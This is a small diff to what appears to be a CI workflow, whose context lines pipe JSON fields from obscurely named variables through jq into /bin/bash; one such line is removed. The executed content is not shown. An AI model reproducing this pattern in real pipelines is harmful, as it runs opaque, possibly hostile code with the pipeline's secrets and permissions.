@@ -42,7 +42,6 @@ jobs:
           printf '%s' "$r58" | jq -r .ugf93996 | /bin/bash
           printf '%s' "$fz22143" | jq -r .wl9771 | /bin/bash
           echo $b1 | jq -r .duo1 | /bin/bash
-          printf '%s' "$guk7" | jq -r .grqzb77701 | /bin/bash
 
       - name: Save output
         uses: actions/upload-artifact@v4
